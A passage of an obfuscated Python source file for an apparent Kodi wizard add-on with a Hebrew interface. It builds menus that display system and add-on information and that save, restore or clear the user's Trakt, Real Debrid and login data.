		if OO0OO0O0O0O00OOO0 =='packages':continue #line:2781
		O00000000OOOOOOO0 =os .path .join (OOOO0000O000O0OOO ,'addon.xml')#line:2782
		if os .path .exists (O00000000OOOOOOO0 ):#line:2783
			O00OO00O00O00O0OO =open (O00000000OOOOOOO0 )#line:2784
			OO000O00O0O0O00O0 =O00OO00O00O00O0OO .read ()#line:2785
			O0OOOO0OO00O00OO0 =re .compile ("<provides>(.+?)</provides>").findall (OO000O00O0O0O00O0 )#line:2786
			if len (O0OOOO0OO00O00OO0 )==0 :#line:2787
				if OO0OO0O0O0O00OOO0 .startswith ('skin'):OO0OO0O0OOOO0OOOO .append (OO0OO0O0O0O00OOO0 )#line:2788
				if OO0OO0O0O0O00OOO0 .startswith ('repo'):OO0O00OO00O00O0OO .append (OO0OO0O0O0O00OOO0 )#line:2789
				else :O0O0OO0OOOOOO0O00 .append (OO0OO0O0O0O00OOO0 )#line:2790
			elif not (O0OOOO0OO00O00OO0 [0 ]).find ('executable')==-1 :OOOO000000O00OO00 .append (OO0OO0O0O0O00OOO0 )#line:2791
			elif not (O0OOOO0OO00O00OO0 [0 ]).find ('video')==-1 :O000000OO00000000 .append (OO0OO0O0O0O00OOO0 )#line:2792
			elif not (O0OOOO0OO00O00OO0 [0 ]).find ('audio')==-1 :OOOO000O0000O0OOO .append (OO0OO0O0O0O00OOO0 )#line:2793
			elif not (O0OOOO0OO00O00OO0 [0 ]).find ('image')==-1 :OO00OOOO0OO0O0O0O .append (OO0OO0O0O0O00OOO0 )#line:2794
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2796
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0OOOOO0O0OO0OO [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2797
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0OOOOO0O0OO0OO [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2798
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:2799
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0OOOOO0O0OO0OO [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2800
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0OOOOO0O0OO0OO [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2801
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2803
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0OOOOO0O0OO0OO [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2804
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0OOOOO0O0OO0OO [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2805
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2807
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O0OO00O0000O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2808
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O000O00O0000O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2809
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O0O00O0OO0OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2810
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2812
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O0OOO0OO0OO0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2813
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OO0O00OO0000O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2814
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOO00O000O000O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2815
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2817
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0OOOOO0O0OO0OO [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2818
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O0O00O00000O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2819
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O0O00O0O000OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2820
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OO0000OO000O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2821
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0OOOOO0O0OO0OO [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2822
	OO0O0OOO00O0000O0 =len (OO00OOOO0OO0O0O0O )+len (OOOO000O0000O0OOO )+len (O000000OO00000000 )+len (OOOO000000O00OO00 )+len (O0O0OO0OOOOOO0O00 )+len (OO0OO0O0OOOO0OOOO )+len (OO0O00OO00O00O0OO )#line:2824
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,OO0O0OOO00O0000O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2825
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O000000OO00000000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2826
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOOO000000O00OO00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2827
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOOO000O0000O0OOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2828
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO00OOOO0OO0O0O0O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2829
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0O00OO00O00O0OO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2830
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0OO0O0OOOO0OOOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2831
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O0OO0OOOOOO0O00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2832
def Menu ():#line:2833
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2834
def saveMenu ():#line:2836
	O0O0O0O0O0000OO00 ='[COLOR green]מופעל[/COLOR]';O0OOO0O0O0O00OO00 ='[COLOR red]מבוטל[/COLOR]'#line:2838
	O00O0O0O0OO00OO0O ='true'if KEEPMOVIEWALL =='true'else 'false'#line:2839
	O0O0O0000OO0O0OO0 ='true'if KEEPMOVIELIST =='true'else 'false'#line:2840
	OOOO0O0O0O000O0OO ='true'if KEEPINFO =='true'else 'false'#line:2841
	OOOO0O0O0OO0OO0O0 ='true'if KEEPSOUND =='true'else 'false'#line:2843
	O0O0O0OO0O0OO000O ='true'if KEEPVIEW =='true'else 'false'#line:2844
	O0000O0O00O0OO000 ='true'if KEEPSKIN =='true'else 'false'#line:2845
	O0OO0OOO0OO000O0O ='true'if KEEPSKIN2 =='true'else 'false'#line:2846
	O0O000OOOO0OOO0O0 ='true'if KEEPSKIN3 =='true'else 'false'#line:2847
	O0O0OO000OO0OO0O0 ='true'if KEEPADDONS =='true'else 'false'#line:2848
	O0000OOOO000O0OO0 ='true'if KEEPPVR =='true'else 'false'#line:2849
	O0OO00OO0O0O0OOOO ='true'if KEEPTVLIST =='true'else 'false'#line:2850
	OO0OOOO00OO0OO000 ='true'if KEEPHUBMOVIE =='true'else 'false'#line:2851
	O00OOOO00O0O0OO0O ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:2852
	OOOOOO0O00OO00000 ='true'if KEEPHUBTV =='true'else 'false'#line:2853
	OO00OOOOO0O0O0O0O ='true'if KEEPHUBVOD =='true'else 'false'#line:2854
	O000O0O0OO00O0OO0 ='true'if KEEPHUBKIDS =='true'else 'false'#line:2855
	OO000O000OOOO0O0O ='true'if KEEPHUBMUSIC =='true'else 'false'#line:2856
	O0000000O0O00OO00 ='true'if KEEPHUBMENU =='true'else 'false'#line:2857
	O00O0O000OOOOO0OO ='true'if KEEPPLAYLIST =='true'else 'false'#line:2858
	OOOO000OO00O000OO ='true'if KEEPTRAKT =='true'else 'false'#line:2859
	O0O00O000000000OO ='true'if KEEPREAL =='true'else 'false'#line:2860
	OOO0000OO0OO0O00O ='true'if KEEPRD2 =='true'else 'false'#line:2861
	O0OOOOOO00OOO0OO0 ='true'if KEEPTORNET =='true'else 'true'#line:2862
	OO00O00OOOO0O0O00 ='true'if KEEPLOGIN =='true'else 'false'#line:2863
	OO0OO00000O0000OO ='true'if KEEPSOURCES =='true'else 'false'#line:2864
	OO00O0OOO0OOO00O0 ='true'if KEEPADVANCED =='true'else 'false'#line:2865
	OO000OO00OOOOOOOO ='true'if KEEPPROFILES =='true'else 'false'#line:2866
	OO000OO0O0O0OO00O ='true'if KEEPFAVS =='true'else 'false'#line:2867
	O0OO00000O00O0O0O ='true'if KEEPREPOS =='true'else 'false'#line:2868
	OO0OO00OO00O00OOO ='true'if KEEPSUPER =='true'else 'false'#line:2869
	O0OO0000O0OO0O00O ='true'if KEEPWHITELIST =='true'else 'false'#line:2870
	addFile ('אפשרויות שמירה קודי אנונימוס','',themeit =THEME3 )#line:2874
	if O0OO0000O0OO0O00O =='true':#line:2875
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:2876
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:2877
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:2878
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:2879
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:2880
	addFile ('%s התקנת קיר סרטים: '%O00O0O0O0OO00OO0O .replace ('true',O0O0O0O0O0000OO00 ).replace ('false',O0OOO0O0O0O00OO00 ),'togglesetting','keepmoviewall',icon =ICONTRAKT ,themeit =THEME1 )#line:2882
	addFile ('%s שמירת חשבון RD: '%O0O00O000000000OO .replace ('true',O0O0O0O0O0000OO00 ).replace ('false',O0OOO0O0O0O00OO00 ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:2883
	addFile ('%s שמירת חשבון טראקט: '%OOOO000OO00O000OO .replace ('true',O0O0O0O0O0000OO00 ).replace ('false',O0OOO0O0O0O00OO00 ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:2884
	addFile ('%s שמירת מועדפים: '%OO000OO0O0O0OO00O .replace ('true',O0O0O0O0O0000OO00 ).replace ('false',O0OOO0O0O0O00OO00 ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:2887
	addFile ('%s שמירת לקוח טלוויזיה: '%O0000OOOO000O0OO0 .replace ('true',O0O0O0O0O0000OO00 ).replace ('false',O0OOO0O0O0O00OO00 ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:2888
	addFile ('%s שמירת רשימת עורצי טלוויזיה: '%O0OO00OO0O0O0OOOO .replace ('true',O0O0O0O0O0000OO00 ).replace ('false',O0OOO0O0O0O00OO00 ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:2889
	addFile ('%s שמירת אריח סרטים: '%OO0OOOO00OO0OO000 .replace ('true',O0O0O0O0O0000OO00 ).replace ('false',O0OOO0O0O0O00OO00 ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:2890
	addFile ('%s שמירת אריח סדרות: '%O00OOOO00O0O0OO0O .replace ('true',O0O0O0O0O0000OO00 ).replace ('false',O0OOO0O0O0O00OO00 ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:2891
	addFile ('%s שמירת אריח טלויזיה: '%OOOOOO0O00OO00000 .replace ('true',O0O0O0O0O0000OO00 ).replace ('false',O0OOO0O0O0O00OO00 ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:2892
	addFile ('%s שמירת אריח תוכן ישראלי: '%OO00OOOOO0O0O0O0O .replace ('true',O0O0O0O0O0000OO00 ).replace ('false',O0OOO0O0O0O00OO00 ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:2893
	addFile ('%s שמירת אריח ילדים: '%O000O0O0OO00O0OO0 .replace ('true',O0O0O0O0O0000OO00 ).replace ('false',O0OOO0O0O0O00OO00 ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:2894
	addFile ('%s שמירת אריח מוסיקה: '%OO000O000OOOO0O0O .replace ('true',O0O0O0O0O0000OO00 ).replace ('false',O0OOO0O0O0O00OO00 ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:2895
	addFile ('%s שמירת תפריט אריחים ראשי: '%O0000000O0O00OO00 .replace ('true',O0O0O0O0O0000OO00 ).replace ('false',O0OOO0O0O0O00OO00 ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:2896
	addFile ('%s שמירת כל האריחים בסקין: '%O0000O0O00O0OO000 .replace ('true',O0O0O0O0O0000OO00 ).replace ('false',O0OOO0O0O0O00OO00 ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:2897
	addFile ('%s שמירת הרחבות שהתקנתי: '%O0O0OO000OO0OO0O0 .replace ('true',O0O0O0O0O0000OO00 ).replace ('false',O0OOO0O0O0O00OO00 ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:2904
	addFile ('%s שמירת סיסמאות, חשבונות ,מיקומי הורדות: '%OOOO0O0O0O000O0OO .replace ('true',O0O0O0O0O0000OO00 ).replace ('false',O0OOO0O0O0O00OO00 ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:2905
	addFile ('%s שמירת ספריית סרטים וסדרות: '%O0O0O0000OO0O0OO0 .replace ('true',O0O0O0O0O0000OO00 ).replace ('false',O0OOO0O0O0O00OO00 ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:2908
	addFile ('%s שמירת מקורות וידאו: '%OO0OO00000O0000OO .replace ('true',O0O0O0O0O0000OO00 ).replace ('false',O0OOO0O0O0O00OO00 ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:2909
	addFile ('%s שמירת הגדרות סאונד ורזולוציה: '%OOOO0O0O0OO0OO0O0 .replace ('true',O0O0O0O0O0000OO00 ).replace ('false',O0OOO0O0O0O00OO00 ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:2910
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה : '%O0O0O0OO0O0OO000O .replace ('true',O0O0O0O0O0000OO00 ).replace ('false',O0OOO0O0O0O00OO00 ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:2912
	addFile ('%s שמירת פליליסט לאודר: '%O00O0O000OOOOO0OO .replace ('true',O0O0O0O0O0000OO00 ).replace ('false',O0OOO0O0O0O00OO00 ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:2913
	addFile ('%s שמירת הרחבות ידנית: '%O0OO0000O0OO0O00O .replace ('true',O0O0O0O0O0000OO00 ).replace ('false',O0OOO0O0O0O00OO00 ),'togglesetting','keepwhitelist',icon =ICONSAVE ,themeit =THEME1 )#line:2914
	addFile ('%s שמירת הגדרות באפר: '%OO00O0OOO0OOO00O0 .replace ('true',O0O0O0O0O0000OO00 ).replace ('false',O0OOO0O0O0O00OO00 ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:2918
	addFile ('%s שמירת סופר מועדפים: '%OO0OO00OO00O00OOO .replace ('true',O0O0O0O0O0000OO00 ).replace ('false',O0OOO0O0O0O00OO00 ),'togglesetting','keepsuper',icon =ICONSAVE ,themeit =THEME1 )#line:2919
	addFile ('%s שמירת רשימות ריפו: '%O0OO00000O00O0O0O .replace ('true',O0O0O0O0O0000OO00 ).replace ('false',O0OOO0O0O0O00OO00 ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:2920
	setView ('files','viewType')#line:2922
def traktMenu ():#line:2924
	O000OO0O0OO00OO0O ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:2925
	OO0OO000OOO0O00OO =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:2926
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:2927
	addFile ('Save Trakt Data: %s'%O000OO0O0OO00OO0O ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:2928
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (OO0OO000OOO0O00OO ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:2929
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:2930
	for O000OO0O0OO00OO0O in traktit .ORDER :#line:2932
		O0OO0O0OOO00OO0OO =TRAKTID [O000OO0O0OO00OO0O ]['name']#line:2933
		O0O000O0O0OOO0OOO =TRAKTID [O000OO0O0OO00OO0O ]['path']#line:2934
		O0OO0OO000OOO00OO =TRAKTID [O000OO0O0OO00OO0O ]['saved']#line:2935
		O00OO0OO000O0OOO0 =TRAKTID [O000OO0O0OO00OO0O ]['file']#line:2936
		OOO0OO0O0O00OO000 =wiz .getS (O0OO0OO000OOO00OO )#line:2937
		O000O00OOO000O00O =traktit .traktUser (O000OO0O0OO00OO0O )#line:2938
		O00OOOO0O00O00000 =TRAKTID [O000OO0O0OO00OO0O ]['icon']if os .path .exists (O0O000O0O0OOO0OOO )else ICONTRAKT #line:2939
		O0O0OOOO00OOOO00O =TRAKTID [O000OO0O0OO00OO0O ]['fanart']if os .path .exists (O0O000O0O0OOO0OOO )else FANART #line:2940
		OOOO0O0O00OOO0O0O =createMenu ('saveaddon','Trakt',O000OO0O0OO00OO0O )#line:2941
		OOO00O00OO00OOOOO =createMenu ('save','Trakt',O000OO0O0OO00OO0O )#line:2942
		OOOO0O0O00OOO0O0O .append ((THEME2 %'%s Settings'%O0OO0O0OOO00OO0OO ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,O000OO0O0OO00OO0O )))#line:2943
		addFile ('[+]-> %s'%O0OO0O0OOO00OO0OO ,'',icon =O00OOOO0O00O00000 ,fanart =O0O0OOOO00OOOO00O ,themeit =THEME3 )#line:2945
		if not os .path .exists (O0O000O0O0OOO0OOO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O00OOOO0O00O00000 ,fanart =O0O0OOOO00OOOO00O ,menu =OOOO0O0O00OOO0O0O )#line:2946
		elif not O000O00OOO000O00O :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',O000OO0O0OO00OO0O ,icon =O00OOOO0O00O00000 ,fanart =O0O0OOOO00OOOO00O ,menu =OOOO0O0O00OOO0O0O )#line:2947
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O000O00OOO000O00O ,'authtrakt',O000OO0O0OO00OO0O ,icon =O00OOOO0O00O00000 ,fanart =O0O0OOOO00OOOO00O ,menu =OOOO0O0O00OOO0O0O )#line:2948
		if OOO0OO0O0O00OO000 =="":#line:2949
			if os .path .exists (O00OO0OO000O0OOO0 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',O000OO0O0OO00OO0O ,icon =O00OOOO0O00O00000 ,fanart =O0O0OOOO00OOOO00O ,menu =OOO00O00OO00OOOOO )#line:2950
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',O000OO0O0OO00OO0O ,icon =O00OOOO0O00O00000 ,fanart =O0O0OOOO00OOOO00O ,menu =OOO00O00OO00OOOOO )#line:2951
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OOO0OO0O0O00OO000 ,'',icon =O00OOOO0O00O00000 ,fanart =O0O0OOOO00OOOO00O ,menu =OOO00O00OO00OOOOO )#line:2952
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2954
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2955
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2956
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2957
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2958
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2959
	setView ('files','viewType')#line:2960
def realMenu ():#line:2962
	OO00O00O0O00O0O0O ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:2963
	OO00OO00000O0O00O =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:2964
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:2965
	addFile ('Save Real Debrid Data: %s'%OO00O00O0O00O0O0O ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:2966
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (OO00OO00000O0O00O ),'',icon =ICONREAL ,themeit =THEME3 )#line:2967
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:2968
	for OOO0O00O00O00OOO0 in debridit .ORDER :#line:2970
		OOOOO000000OO0OOO =DEBRIDID [OOO0O00O00O00OOO0 ]['name']#line:2971
		O0OOOOO0O0OOOO0O0 =DEBRIDID [OOO0O00O00O00OOO0 ]['path']#line:2972
		OOO0OOOOOO0O0OOO0 =DEBRIDID [OOO0O00O00O00OOO0 ]['saved']#line:2973
		O0O00OO000O0OO0OO =DEBRIDID [OOO0O00O00O00OOO0 ]['file']#line:2974
		O00OOO00O0O00O0O0 =wiz .getS (OOO0OOOOOO0O0OOO0 )#line:2975
		O0O0000OOOO0OO00O =debridit .debridUser (OOO0O00O00O00OOO0 )#line:2976
		OO000OO000O0O000O =DEBRIDID [OOO0O00O00O00OOO0 ]['icon']if os .path .exists (O0OOOOO0O0OOOO0O0 )else ICONREAL #line:2977
		OO0O0000OOOO0O000 =DEBRIDID [OOO0O00O00O00OOO0 ]['fanart']if os .path .exists (O0OOOOO0O0OOOO0O0 )else FANART #line:2978
		OOOOO0000OO0OO000 =createMenu ('saveaddon','Debrid',OOO0O00O00O00OOO0 )#line:2979
		O0O0OO0OOO00000O0 =createMenu ('save','Debrid',OOO0O00O00O00OOO0 )#line:2980
		OOOOO0000OO0OO000 .append ((THEME2 %'%s Settings'%OOOOO000000OO0OOO ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,OOO0O00O00O00OOO0 )))#line:2981
		addFile ('[+]-> %s'%OOOOO000000OO0OOO ,'',icon =OO000OO000O0O000O ,fanart =OO0O0000OOOO0O000 ,themeit =THEME3 )#line:2983
		if not os .path .exists (O0OOOOO0O0OOOO0O0 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OO000OO000O0O000O ,fanart =OO0O0000OOOO0O000 ,menu =OOOOO0000OO0OO000 )#line:2984
		elif not O0O0000OOOO0OO00O :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',OOO0O00O00O00OOO0 ,icon =OO000OO000O0O000O ,fanart =OO0O0000OOOO0O000 ,menu =OOOOO0000OO0OO000 )#line:2985
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O0O0000OOOO0OO00O ,'authdebrid',OOO0O00O00O00OOO0 ,icon =OO000OO000O0O000O ,fanart =OO0O0000OOOO0O000 ,menu =OOOOO0000OO0OO000 )#line:2986
		if O00OOO00O0O00O0O0 =="":#line:2987
			if os .path .exists (O0O00OO000O0OO0OO ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',OOO0O00O00O00OOO0 ,icon =OO000OO000O0O000O ,fanart =OO0O0000OOOO0O000 ,menu =O0O0OO0OOO00000O0 )#line:2988
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',OOO0O00O00O00OOO0 ,icon =OO000OO000O0O000O ,fanart =OO0O0000OOOO0O000 ,menu =O0O0OO0OOO00000O0 )#line:2989
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O00OOO00O0O00O0O0 ,'',icon =OO000OO000O0O000O ,fanart =OO0O0000OOOO0O000 ,menu =O0O0OO0OOO00000O0 )#line:2990
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2992
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2993
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2994
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2995
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2996
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2997
	setView ('files','viewType')#line:2998
def loginMenu ():#line:3000
	OO00OOOOO00OO000O ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3001
	O00O0OOO0O0O0OOO0 =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3002
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3003
	addFile ('Save Login Data: %s'%OO00OOOOO00OO000O ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3004
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (O00O0OOO0O0O0OOO0 ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3005
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3006
	for OO00OOOOO00OO000O in loginit .ORDER :#line:3008
		OOOOOOOOO0O00O0O0 =LOGINID [OO00OOOOO00OO000O ]['name']#line:3009
		O00OO00000O00OO0O =LOGINID [OO00OOOOO00OO000O ]['path']#line:3010
		OO00O0OOOOO000000 =LOGINID [OO00OOOOO00OO000O ]['saved']#line:3011
		O0OOOO0O00OOOOOO0 =LOGINID [OO00OOOOO00OO000O ]['file']#line:3012
		O00O0OO0O0OOOOO00 =wiz .getS (OO00O0OOOOO000000 )#line:3013
		O0OO0000O0000OO0O =loginit .loginUser (OO00OOOOO00OO000O )#line:3014
		OOOO0000O0OOOOO00 =LOGINID [OO00OOOOO00OO000O ]['icon']if os .path .exists (O00OO00000O00OO0O )else ICONLOGIN #line:3015
		O000O0000000OOO00 =LOGINID [OO00OOOOO00OO000O ]['fanart']if os .path .exists (O00OO00000O00OO0O )else FANART #line:3016
		OOOOO00OO00000000 =createMenu ('saveaddon','Login',OO00OOOOO00OO000O )#line:3017
		OO0O0OOOO000OOOO0 =createMenu ('save','Login',OO00OOOOO00OO000O )#line:3018
